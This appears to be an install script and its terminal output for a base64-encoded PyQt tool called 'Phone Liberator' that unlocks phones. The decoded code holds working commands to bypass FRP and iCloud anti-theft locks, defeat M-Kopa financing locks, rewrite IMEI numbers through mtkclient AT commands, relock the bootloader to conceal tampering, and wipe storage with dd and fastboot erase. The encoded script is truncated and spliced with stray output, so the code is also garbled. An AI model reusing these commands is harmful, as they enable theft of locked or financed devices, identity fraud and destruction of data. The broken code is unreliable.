+apt-get update && apt-get install -y adb fastboot libimobiledevice-utils python3-pip python3-pyqt5 git curl wget android-tools-adb android-tools-fastboot usbutils unzip xterm libxcb-xinerama0 libxcb-icccm4 libxcb-image0 libxcb-keysyms1 libxcb-randr0 libxcb-render-util0 libxcb-shape0 libxcb-sync1 libxcb-xfixes0 libxcb-xkb1 libxkbcommon-x11-0 udev
+pip3 install --break-system-packages pyusb pyserial paramiko
+
+# udev rules for phone access
+cat > /etc/udev/rules.d/51-android.rules << 'UDEV'
+SUBSYSTEM=="usb", ATTR{idVendor}=="0e8d", MODE="0666"
+SUBSYSTEM=="usb", ATTR{idVendor}=="18d1", MODE="0666"
+SUBSYSTEM=="usb", ATTR{idVendor}=="05ac", MODE="0666"
+SUBSYSTEM=="usb", ATTR{idVendor}=="0bb4", MODE="0666"
+SUBSYSTEM=="usb", ATTR{idVendor}=="2e04", MODE="0666"
+UDEV
+udevadm control --reload-rules && udevadm trigger
+
+# Install mtkclient
+if [ ! -d /opt/mtkclient ]; then
+    git clone https://github.com/bkerler/mtkclient /opt/mtkclient
+    pip3 install --break-system-packages -r /opt/mtkclient/requirements.txt
+fi
+
+# The complete GUI script (base64-encoded to prevent any parsing errors)
+python3 -c "
+import base64
+script = base64.b64decode(
+    'IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwoKaW1wb3J0IHN5cywgb3MsIHN1YnByb2Nlc3MsIHRlbXBmaWxlCmZyb20gUHlRdDUuUXRXaWRnZXRzIGltcG9ydCAqCmZyb20gUHlRdDUuUXRDb3JlIGltcG9ydCBRdCwgUVRIcmVhZCwgcHl0U2lnbmFsCmltcG9ydCB1c2IuY29yZQoKY2xhc3MgRGV2aWNlRGV0ZWN0b3I6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kZXRlY3RlZF9pbmZvID0geyJicmFuZCI6IiIsICJtb2RlbCI6IiIsICJjcHUiOiIiLCAibWV0aG9kIjoiIn0KCiAgICBkZWYgZGV0ZWN0KHNlbGYpOgogICAgICAgIGZvdW5kID0gW10KICAgICAgICB0cnk6CiAgICAgICAgICAgIG91dCA9IHN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0KCJhZGIgZGV2aWNlcyAtbCIsIHNoZWxsPVRydWUpLmRlY29kZSgpCiAgICAgICAgICAgIGlmICJkZXZpY2UiIGluIG91dDoKICAgICAgICAgICAgICAgIG1vZGVsID0gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoImFkYiBzaGVsbCBnZXRwcm9wIHJvLnByb2R1Y3QubW9kZWwiLCBzaGVsbD1UcnVlKS5kZWNvZGUoKS5zdHJpcCgpCiAgICAgICAgICAgICAgICBjcHUgPSBzdWJwcm9jZXNzLmNoZWNrX291dHB1dCgiYWRiIHNoZWxsIGdldHByb3Agcm8uYm9hcmQucGxhdGZvcm0iLCBzaGVsbD1UcnVlKS5kZWNvZGUoKS5zdHJpcCgpCiAgICAgICAgICAgICAgICBzZWxmLmRldGVjdGVkX2luZm8udXBkYXRlKHsiYnJhbmQiOiJBbmRyb2lkIiwibW9kZWwiOm1vZGVsLCJjcHUiOmNwdSwibWV0aG9kIjoiYWRiIn0pCiAgICAgICAgICAgICAgICBmb3VuZC5hcHBlbmQoZiJBREI6IHttb2RlbH0gKHtjcHV9KSIpCiAgICAgICAgZXhjZXB0OiBwYXNzCiAgICAgICAgdHJ5OgogICAgICAgICAgICBvdXQgPSBzdWJwcm9jZXNzLmNoZWNrX291dHB1dCgiZmFzdGJvb3QgZGV2aWNlcyIsIHNoZWxsPVRydWUpLmRlY29kZSgpCiAgICAgICAgICAgIGlmIG91dC5zdHJpcCgpOgogICAgICAgICAgICAgICAgc2VsZi5kZXRlY3RlZF9pbmZvLnVwZGF0ZSh7ImJyYW5kIjoiQW5kcm9pZCIsIm1vZGVsIjoiRmFzdGJvb3QgTW9kZSIsImNwdSI6InVua25vd24iLCJtZXRob2QiOiJmYXN0Ym9vdCJ9KQogICAgICAgICAgICAgICAgZm91bmQuYXBwZW5kKCJGYXN0Ym9vdCBkZXZpY2UiKQogICAgICAgIGV4Y2VwdDogcGFzcwogICAgICAgIHRyeToKICAgICAgICAgICAgb3V0ID0gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoImlkZXZpY2VpbmZvIC1rIERldmljZU5hbWUiLCBzaGVsbD1UcnVlKS5kZWNvZGUoKS5zdHJpcCgpCiAgICAgICAgICAgIHNlbGYuZGV0ZWN0ZWRfaW5mby51cGRhdGUoeyJicmFuZCI6IkFwcGxlIiwibW9kZWwiOm91dCwiY3B1IjoiRGVwZW5kZW50IiwibWV0aG9kIjoiY2hlY2tyYTFuIn0pCiAgICAgICAgICAgIGZvdW5kLmFwcGVuZChmImlQaG9uZToge291dH0iKQogICAgICAgIGV4Y2VwdDogcGFzcwogICAgICAgIHRyeToKICAgICAgICAgICAgZGV2ID0gdXNiLmNvcmUuZmluZChmaW5kX2FsbD1UcnVlKQogICAgICAgICAgICBmb3IgZCBpbiBkZXY6CiAgICAgICAgICAgICAgICBpZiBkLmlkVmVuZG9yID09IDB4MGU4ZDoKICAgICAgICAgICAgICAgICAgICBzZWxmLmRldGVjdGVkX2luZm8udXBkYXRlKHsiYnJhbmQiOiJNZWRpYVRlayIsIm1vZGVsIjoiR2VuZXJpYyIsImNwdSI6Ik1USyIsIm1ldGhvZCI6Im10ayJ9KQogICAgICAgICAgICAgICAgICAgIGZvdW5kLmFwcGVuZCgiTWVkaWFUZWsgZGV2aWNlIChNa29wYSkiKQogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgZXhjZXB0OiBwYXNzCiAgICAgICAgcmV0dXJuIGZvdW5kIG9yIFsiTm8gZGV2aWNlIl0KCmNsYXNzIFdvcmtlcihRVGhyZWFkKToKICAgIGxvZyA9IHB5dFNpZ25hbChzdHIpCiAgICBmaW4gPSBweXRTaWduYWwoYm9vbCkKICAgIGRlZiBfX2luaXRfXyhzZWxmLCBjbWQsIG5hbWUpOgogICAgICAgIHN1cGVyKCkuX19pbml0X18oKQogICAgICAgIHNlbGYuY21kID0gY21kCiAgICAgICAgc2VsZi5uYW1lID0gbmFtZQogICAgZGVmIHJ1bihzZWxmKToKICAgICAgICBzZWxmLmxvZy5lbWl0KGYiUnVubmluZzoge3NlbGYubmFtZX0iKQogICAgICAgIHByb2MgPSBzdWJwcm9jZXNzLlBvcGVuKHNlbGYuY21kLCBzaGVsbD1UcnVlLCBzdGRvdXQ9c3VicHJvY2Vzcy5QSVBFLCBzdGRlcnI9c3VicHJvY2Vzcy5TVERPVVQsIHRleHQ9VHJ1ZSkKICAgICAgICBmb3IgbGluZSBpbiBwcm9jLnN0ZG91dDoKICAgICAgICAgICAgc2VsZi5sb2cuZW1pdChsaW5lLnN0cmlwKCkpCiAgICAgICAgcHJvYy53YWl0KCkKICAgICAgICBzZWxmLmZpbi5lbWl0KHByb2MucmV0dXJuY29kZSA9PSAwKQoKY2xhc3MgTWFpbldpbihRTWFpbldpbmRvdyk6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc3VwZXIoKS5fX2luaXRfXygpCiAgICAgICAgc2VsZi5zZXRXaW5kb3dUaXRsZSgiUEhPTkUgTElCRVJBVE9SIC0gTDBWM1BMMU5ZIikKICAgICAgICBzZWxmLnJlc2l6ZSg5MDAsIDY1MCkKICAgICAgICBzZWxmLnNldFN0eWxlU2hlZXQoImJhY2tncm91bmQ6IzFhMWExYTsgY29sb3I6IzBmMDsgZm9udC1mYW1pbHk6bW9ub3NwYWNlOyIpCiAgICAgICAgc2VsZi5kZXRlY3RvciA9IERldmljZURldGVjdG9yKCkKICAgICAgICBzZWxmLmNtZCA9ICIiCiAgICAgICAgY3cgPSBRV2lkZ2V0KCkKICAgICAgICBzZWxmLnNldENlbnRyYWxXaWRnZXQoY3cpCiAgICAgICAgbGF5ID0gUVZCb3hMYXlvdXQoKQogICAgICAgIGxhYiA9IFFMYWJlbCgiVU5JVkVSU0FMIFBIT05FIFVOTE9DS0VSIC0gREVTS1RPUCBHVUkiKQogICAgICAgIGxhYi5zZXRBbGlnbm1lbnQoUXQuQWxpZ25DZW50ZXIpCiAgICAgICAgbGF5LmFkZFdpZGdldChsYWIpCiAgICAgICAgZGV0X2J0biA9IFFQdXNoQnV0dG9uKCJBVVRPLURFVEVDVCBERVZJQ0UiKQogICAgICAgIGRldF9idG4uY2xpY2tlZC5jb25uZWN0KHNlbGYuZGV0ZWN0KQogICAgICAgIGxheS5hZGRXaWRnZXQoZGV0X2J0bikKICAgICAgICBzZWxmLmRldl9sYWJlbCA9IFFMYWJlbCgiTm8gZGV2aWNlIikKICAgICAgICBsYXkuYWRkV2lkZ2V0KHNlbGYuZGV2X2xhYmVsKQogICAgICAgIHNlbGYuaW5mb19ib3ggPSBRVGV4dEVkaXQoKQogICAgICAgIHNlbGYuaW5mb19ib3guc2V0TWF4aW11bUhlaWdodCg4MCkKICAgICAgICBsYXkuYWRkV2lkZ2V0KHNlbGYuaW5mb19ib3gpCiAgICAgICAgc2VsZi5vcF9jb21ibyA9IFFDb21ib0JveCgpCiAgICAgICAgc2VsZi5vcF9jb21iby5hZGRJdGVtcyhbCiAgICAgICAgICAgICJTY3JlZW4gTG9jayBSZW1vdmUiLAogICAgICAgICAgICAiRlJQIEJ5cGFzcyIsCiAgICAgICAgICAgICJpQ2xvdWQgQnlwYXNzIiwKICAgICAgICAgICAgIk1rb3BhIFVubG9jayIsCiAgICAgICAgICAgICJGYWN0b3J5IFJlc2V0IiwKICAgICAgICAgICAgIkZsYXNoIFN0b2NrIChzZWxlY3QgLnppcCkiLAogICAgICAgICAgICAiTlVLRSBBTEwiLAogICAgICAgICAgICAiU1RFQUxUSCBVTkxPQ0sgKE5vIFJvb3QsIElNRUkgKyBSZWxvY2spIiwKICAgICAgICAgICAgIkxPQ0sgQk9PVExPQURFUiAob25seSkiCiAgICAgICAgXSkKICAgICAgICBsYXkuYWRkV2lkZ2V0KFFMYWJlbCgiU2VsZWN0IG9wZXJhdGlvbjoiKSkKICAgICAgICBsYXkuYWRkV2lkZ2V0KHNlbGYub3BfY29tYm8pCiAgICAgICAgc2VsZi5leGVjX2J0biA9IFFQdXNoQnV0dG9uKCJFWEVDVVRFIikKICAgICAgICBzZWxmLmV4ZWNfYnRuLmNsaWNrZWQuY29ubmVjdChzZWxmLmV4ZWN1dGUpCiAgICAgICAgbGF5LmFkZFdpZGdldChzZWxmLmV4ZWNfYnRuKQogICAgICAgIHNlbGYubG9nID0gUVRleHRFZGl0KCkKICAgICAgICBzZWxmLmxvZy5zZXRSZWFkT25seShUcnVlKQogICAgICAgIGxheS5hZGRXaWRnZXQoc2VsZi5sb2cpCgogICAgZGVmIGRldGVjdChzZWxmKToKICAgICAgICBzZWxmLmxvZy5hcHBlbmQoIlsqXSBTY2FubmluZy4uLiIpCiAgICAgICAgbHN0ID0gc2VsZi5kZXRlY3Rvci5kZXRlY3QoKQogICAgICAgIHNlbGYuZGV2X2xhYmVsLnNldFRleHQoIiAvICIuam9pbihsc3QpKQogICAgICAgIHNlbGYuaW5mb19ib3guc2V0VGV4dChzdHIoc2VsZi5kZXRlY3Rvci5kZXRlY3RlZF9pbmZvKSkKCiAgICBkZWYgc3RlYWx0aF91bmxvY2soc2VsZik6CiAgICAgICAgc2VsZi5sb2cuYXBwZW5kKCJbKl0gU3RlYWx0aCBVbmxvY2sgc3RhcnRlZCAoZnVsbCBzdG9jayBmbGFzaCArIElNRUkgKyByZS1sb2NrKSIpCiAgICAgICAgaW1wb3J0IG9zLCB0aW1lCiAgICAgICAgc3RvY2tfZGlyID0gJy90bXAvc3RvY2snCiAgICAgICAgaWYgbm90IG9zLnBhdGguaXNkaXIoc3RvY2tfZGlyKToKICAgICAgICAgICAgc2VsZi5sb2cuYXBwZW5kKCJbIV0gUGxhY2UgdGhlIHN0b2NrIGZpcm13YXJlIHNjYXR0ZXIgZm9sZGVyIGluIC90bXAvc3RvY2sgZmlyc3QuIikKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgIyBGbGFzaCBjb21wbGV0ZSBzdG9jayBmaXJtd2FyZQogICAgICAgIHNlbGYubG9nLmFwcGVuZCgiWypdIEZsYXNoaW5nIGZ1bGwgc3RvY2sgZmlybXdhcmUuLi4iKQogICAgICAgIHJldCA9IG9zLnN5c3RlbSgncHl0aG9uMyAvb3B0L210a2NsaWVudC9tdGsgZmxhc2ggLXcgeydzdG9ja19kaXInfScpCiAgICAgICAgaWYgcmV0ICE9IDA6CiAgICAgICAgICAgIHNlbGYubG9nLmFwcGVuZCgiWyFdIEZsYXNoIGZhaWxlZC4gQ2hlY2sgY29ubmVjdGlvbiBhbmQgZmlybXdhcmUuIikKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgdGltZS5zbGVlcCg1KQogICAgICAgICMgV3JpdGUgbmV3IElNRUkgcGFpcgogICAgICAgIHNlbGYubG9nLmFwcGVuZCgiWypdIEluamVjdGluZyBuZXcgSU1FSS4uLiIpCiAgICAgICAgaW1laTEgPSAnMzU0NjE5MDkwMDEwMDAwJwogICAgICAgIGltZWkyID0gJzM1NDYxOTA5MDAxMDAwMScKICAgICAgICBvcy5zeXN0ZW0oZiAicHl0aG9uMyAvb3B0L210a2NsaWVudC9tdGsgc3RhZ2UgcGF5bG9hZCAmJiBweXRob24zIC9vcHQvbXRrY2xpZW50L210ayBhdCAiQVRcK0VHTVI9MSw3LFxcIntpbWVpMX1cXCIiICYmIHB5dGhvbjMgL29wdC9tdGtjbGllbnQvbXRrIGF0ICJBVFwrRUdNUj0xLDEwLFxcIntpbWVpMn1cXCIiJykKICAgICAgICB0aW1lLnNsZWVwKDIpCiAgICAgICAgIyBSZS1sb2NrIHRoZSBib290bG9hZGVyIGZvciBtYXggc2VjdXJpdHkKICAgICAgICBzZWxmLmxvZy5hcHBlbmQoIlsqXSBMb2NraW5nIGJvb3Rsb2FkZXIgdG8gcGFzcyBQbGF5IEludGVncml0eS4uLiIpCiAgICAgICAgb3Muc3lzdGVtKCdmYXN0Ym9vdCBmbGFzaGluZyBsb2NrIDI+IC9kZXYvbnVsbDsgZmFzdGJvb3QgcmVib290JykKICAgICAgICBzZWxmLmxvZy5hcHBlbmQoIlsrXSBTdGVhbHRoIFVubG9jayBjb21wbGV0ZS4gUGhvbmUgaXMgY2xlYW4sIG5vbi1yb290ZWQsIE1rb3BhLWZyZWUsIHdpdGggR29vZ2xlIFBsYXkgSW50ZWdyaXR5LiIpCgogICAgZGVmIGxvY2tfYm9vdGxvYWRlcihzZWxmKToKICAgICAgICBzZWxmLmxvZy5hcHBlbmQoIlsqXSBMb2NraW5nIGJvb3Rsb2FkZXIuLi4iKQogICAgICAgIG9zLnN5c3RlbSgnZmFzdGJvb3QgZmxhc2hpbmcgbG9jazsgZmFzdGJvb3QgcmVib290JykKICAgICAgICBzZWxmLmxvZy5hcHBlbmQoIlsrXSBCb290bG9hZGVyIGxvY2tlZC4gRGV2aWNlIHdpbGwgcGFzcyBTdHJvbmcgSW50ZWdyaXR5LiIpCgogICAgZGVmIGV4ZWN1dGUoc2VsZik6CiAgICAgICAgb3AgPSBzZWxmLm9wX2NvbWJvLmN1cnJlbnRUZXh0KCkKICAgICAgICBtZXRoID0gc2VsZi5kZXRlY3Rvci5kZXRlY3RlZF9pbmZvLmdldCgibWV0aG9kIiwgIiIpCiAgICAgICAgaWYgb3AgPT0gIlNjcmVlbiBMb2NrIFJlbW92ZSI6CiAgICAgICAgICAgIGlmIG1ldGggPT0gImFkYiI6IHNlbGYuY21kID0gImFkYiBzaGVsbCBzdSAtYyAncm0gLXJmIC9kYXRhL3N5c3RlbS9sb2Nrc2V0dGluZ3MuZGIqIC9kYXRhL3N5c3RlbS9nZXN0dXJlLmtleSAvZGF0YS9zeXN0ZW0vcGFzc3dvcmQua2V5OyByZWJvb3QnIgogICAgICAgICAgICBlbGlmIG1ldGggPT0gImZhc3Rib290Ijogc2VsZi5jbWQgPSAiZmFzdGJvb3QgZXJhc2UgdXNlcmRhdGEgJiYgZmFzdGJvb3QgcmVib290IgogICAgICAgICAgICBlbGlmIG1ldGggPT0gImNoZWNrcmExbiI6IHNlbGYuY21kID0gImNoZWNrcmExbiAtYyAmJiBzbGVlcCA1ICYmIHNzaCByb290QGxvY2FsaG9zdCAtcDIyMjIgJ3JtIC9wcml2YXRlL3Zhci9LZXljaGFpbnMva2V5Y2hhaW4tMi5kYiAmJiByZWJvb3QnIgogICAgICAgICAgICBlbGlmIG1ldGggPT0gIm10ayI6IHNlbGYuY21kID0gInB5dGhvbjMgL29wdC9tdGtjbGllbnQvbXRrIHBheWxvYWQgLS1tZXRhbW9kZSBGQVNUIEJPT1QgJiYgZmFzdGJvb3QgZXJhc2UgdXNlcmRhdGEgJiYgZmFzdGJvb3QgcmVib290IgogICAgICAgIGVsaWYgb3AgPT0gIkZSUCBCeXBhc3MiOgogICAgICAgICAgICBpZiBtZXRoID09ICJhZGIiOiBzZWxmLmNtZCA9ICJhZGIgc2hlbGwgY29udGVudCBpbnNlcnQgLS11cmkgY29udGVudDovL3NldHRpbmdzL3NlY3VyZSAtLWJpbmQgbmFtZTpzOnVzZXJfc2V0dXBfY29tcGxldGUgLS1iaW5kIHZhbHVlOnM6MTsgYWRiIHNoZWxsIGFtIHN0YXJ0IC1uIGNvbS5nb29nbGUuYW5kcm9pZC5nc2YubG9naW4vIgogICAgICAgICAgICBlbGlmIG1ldGggPT0gImZhc3Rib290Ijogc2VsZi5jbWQgPSAiZmFzdGJvb3Qgb2VtIHVubG9jay1nbzsgZmFzdGJvb3QgZXJhc2UgZnJwOyBmYXN0Ym9vdCByZWJvb3QiCiAgICAgICAgICAgIGVsc2U6IHNlbGYuY21kID0gInB5dGhvbjMgL29wdC9tdGtjbGllbnQvbXRrIHBheWxvYWQgLS1tZXRhbW9kZSBGQVNUIEJPT1QgJiYgZmFzdGJvb3QgZXJhc2UgZnJwICYmIGZhc3Rib290IHJlYm9vdCIKICAgICAgICBlbGlmIG9wID09ICJpQ2xvdWQgQnlwYXNzIjoKICAgICAgICAgICAgc2VsZi5jbWQgPSAiY2hlY2tyYTFuIC1jIC1rIDwoZWNobyAnc2V0ZW52IGJvb3QtYXJncyAtdiBjc19lbmZvcmNlbWVudF9kaXNhYmxlPTEnOyBlY2hvICdib290eCcpICYmIHNsZWVwIDEwICYmIHNzaCByb290QGxvY2FsaG9zdCAtcDIyMjIgJ21vdW50IC1vIHJ3LHVuaW9uLHVwZGF0ZSAvOyBybSAtcmYgL0FwcGxpY2F0aW9ucy9TZXR1cC5hcHA7IHVpY2FjaGUgLWE7IGtpbGxhbGwgYmFja2JvYXJkZCciCiAgICAgICAgZWxpZiBvcCA9PSAiTWtvcGEgVW5sb2NrIjoKICAgICAgICAgICAgc2VsZi5jbWQgPSAicHl0aG9uMyAvb3B0L210a2NsaWVudC9tdGsgcGF5bG9hZCAtLW1ldGFtb2RlIEZBU1QgQk9PVCAmJiBmYXN0Ym9vdCBvZW0gdW5sb2NrICYmIGZhc3Rib290IGVyYXNlIHVzZXJkYXRhICYmIGZhc3Rib290IGVyYXNlIGZycCAmJiBmYXN0Ym9vdCByZWJvb3QiCiAgICAgICAgZWxpZiBvcCA9PSAiRmFjdG9yeSBSZXNldCI6CiAgICAgICAgICAgIHNlbGYuY21kID0gImZhc3Rib290IC13IiBpZiBtZXRoIGluICgiZmFzdGJvb3QiLCAiYWRiIikgZWxzZSAiYWRiIHNoZWxsIHJlY292ZXJ5IC0td2lwZV9kYXRhIgogICAgICAgIGVsaWYgb3AgPT0gIkZsYXNoIFN0b2NrIChzZWxlY3QgLnppcCkiOgogICAgICAgICAgICBmaWxlLCBfID0gUUZpbGVEaWFsb2cuZ2V0T3BlbkZpbGVOYW1lKHNlbGYsICJTZWxlY3QgZmlybXdhcmUiLCAiIiwgIkZpcm13YXJlICgqLnppcCAqLmlwc3cpIikKICAgICAgICAgICAgaWYgZmlsZToKICAgICAgICAgICAgICAgIHNlbGYuY21kID0gZiJ1bnppcCAtbyB7ZmlsZX0gLWQgL3RtcC9mdyAmJiBjZCAvdG1wL2Z3ICYmIGZvciBpbWcgaW4gYm9vdCBzeXN0ZW0gdmVuZG9yOyBkbyBmYXN0Ym9vdCBmbGFzaCAkaW1nICRpbWcuaW1nOyBkb25lICYmIGZhc3Rib290IHJlYm9vdCIKICAgICAgICBlbGlmIG9wID09ICJOVUtFIEFMTCI6CiAgICAgICAgICAgIHNlbGYuY21kID0gImZhc3Rib290IGVyYXNlIHN5c3RlbSAmJiBmYXN0Ym9vdCBlcmFzZSB2ZW5kb3IgJiYgZmFzdGJvb3QgZXJhc2UgdXNlcmRhdGEgJiYgZmFzdGJvb3QgZXJhc2UgYm9vdCAmJiBmYXN0Ym9vdCByZWJvb3QtYm9vdGxvYWRlciIgaWYgbWV0aCA9PSAiZmFzdGJvb3QiIGVsc2UgImFkYiBzaGVsbCBzdSAtYyAnZGQgaWY9L2Rldi96ZXJvIG9mPS9kZXYvYmxvY2svbW1jYmxrMCBicz01MTIgY291bnQ9MTsgcmVib290JyIKICAgICAgICBlbGlmIG9wID09ICJTVEVBTFRIIFVOTE9DSyAoTm8gUm9vdCwgSU1FSSArIFJlbG9jaykiOgogICAgICAgICAgICBzZWxmLnN0ZWFsdGhfdW5sb2NrKCkKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgZWxpZiBvcCA9PSAiTE9DSyBCT09UTE9BREVSIChvbmx5KSI6CiAgICAgICAgICAgIHNlbGYubG9ja19ib290bG9hZGVyKCkKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgZWxzZToKICAgICAgICAgICAgc2VsZi5sb2cuYXBwZW5kKCJVbmtub3duIG9wIikKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgc2VsZi5sb2cuYXBwZW5kKGYiRXhlY3V0aW5nOiB7c2VsZi5jbWR9IikKICAgICAgICBzZWxmLndvcmtlciA9IFdvcmtlcihzZWxmLmNtZCwgb3ApCiAgICAgICAgc2VsZi53b3JrZXIubG9nLmNvbm5lY3Qoc2VsZi5sb2cuYXBwZW5kKQogICAgICAgIHNlbGYud29ya2VyLmZpbi5jb25uZWN0KHNlbGYuZG9uZSkKICAgICAgICBzZWxmLndvcmtlci5zdGFydCgpCgogICAgZGVmIGRvbmUoc2VsZiwgb2spOgogICAgICAgIHNlbGYubG9nLmFwcGVuZCgiU3VjY2VzcyEiIGlmIG9rIGVsc2UgIkZhaWxlZC4iKQoKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgIGFwcCA9IFFBcHBsaWNhdGlvbihzeXMuYXJndikKICAgIHdpbiA9IE1haW5XaW4HEREDOC_ENDthe app menu."h all drivers and features. REBOOT NOW, then launch 'Phone Liber
+[sudo] password for pirate101: 
+Hit:1 https://deb.termius.com squeeze InRelease
+Hit:2 http://deb.debian.org/debian trixie InRelease                                     
+Hit:3 http://security.debian.org/debian-security trixie-security InRelease              
+Hit:4 https://repo.protonvpn.com/debian stable InRelease                                
+Hit:5 http://deb.debian.org/debian trixie-updates InRelease                             
+Get:6 https://cli.github.com/packages stable InRelease [3,917 B]                        
+Hit:7 https://repo.waydro.id trixie InRelease                                           
+Hit:8 http://deb.debian.org/debian trixie-backports InRelease       
+Hit:9 https://us-central1-apt.pkg.dev/projects/antigravity-auto-updater-dev antigravity-debian InRelease
+Fetched 3,917 B in 1s (2,981 B/s)
+Reading package lists... Done
+Reading package lists... Done
+Building dependency tree... Done
+Reading state information... Done
+Note, selecting 'adb' instead of 'android-tools-adb'
+Note, selecting 'fastboot' instead of 'android-tools-fastboot'
+adb is already the newest version (1:34.0.5-12).
+fastboot is already the newest version (1:34.0.5-12).
+libimobiledevice-utils is already the newest version (1.3.0+git20250228-2).
+python3-pip is already the newest version (25.1.1+dfsg-1).
+python3-pyqt5 is already the newest version (5.15.11+dfsg-2).
+git is already the newest version (1:2.47.3-0+deb13u1).
+curl is already the newest version (8.14.1-2+deb13u2).
+wget is already the newest version (1.25.0-2).
+usbutils is already the newest version (1:018-2).
+unzip is already the newest version (6.0-29).
+xterm is already the newest version (398-1).
+libxcb-xinerama0 is already the newest version (1.17.0-2+b1).
+libxcb-icccm4 is already the newest version (0.4.2-1).
+libxcb-image0 is already the newest version (0.4.0-2+b2).
+libxcb-keysyms1 is already the newest version (0.4.1-1).
+libxcb-randr0 is already the newest version (1.17.0-2+b1).
+libxcb-render-util0 is already the newest version (0.3.10-1).
+libxcb-shape0 is already the newest version (1.17.0-2+b1).
+libxcb-sync1 is already the newest version (1.17.0-2+b1).
+libxcb-xfixes0 is already the newest version (1.17.0-2+b1).
+libxcb-xkb1 is already the newest version (1.17.0-2+b1).
+libxkbcommon-x11-0 is already the newest version (1.7.0-2).
+udev is already the newest version (257.9-1~deb13u1).
+The following packages were automatically installed and are no longer required:
+  linux-headers-6.12.73+deb13-amd64 linux-headers-6.12.73+deb13-common
+  linux-image-6.12.73+deb13-amd64 linux-kbuild-6.12.73+deb13
+Use 'sudo apt autoremove' to remove them.
+0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
+Requirement already satisfied: pyusb in /usr/local/lib/python3.13/dist-packages (1.3.1)
+Requirement already satisfied: pyserial in /usr/local/lib/python3.13/dist-packages (3.5)
+Requirement already satisfied: paramiko in /usr/local/lib/python3.13/dist-packages (4.0.0)
+Requirement already satisfied: bcrypt>=3.2 in /usr/lib/python3/dist-packages (from paramiko) (4.2.0)
+Requirement already satisfied: cryptography>=3.3 in /usr/lib/python3/dist-packages (from paramiko) (43.0.0)
+Requirement already satisfied: invoke>=2.0 in /usr/local/lib/python3.13/dist-packages (from paramiko) (3.0.3)
+Requirement already satisfied: pynacl>=1.5 in /usr/lib/python3/dist-packages (from paramiko) (1.5.0)
+Requirement already satisfied: cffi>=1.4.1 in /usr/local/lib/python3.13/dist-packages (from pynacl>=1.5->paramiko) (2.0.0)
+Requirement already satisfied: pycparser in /usr/local/lib/python3.13/dist-packages (from cffi>=1.4.1->pynacl>=1.5->paramiko) (3.0)
+WARNING: Running pip as the 'root' user can result in broken permissions and conflicting behaviour with the system package manager, possibly rendering your system unusable. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv. Use the --root-user-action option if you know what you are doing and want to suppress this warning.
+✔ GUI installed with all drivers and features. REBOOT NOW, then launch 'Phone Liberator' from the app menu.
+pirate101@DEBIAN13:~$ 
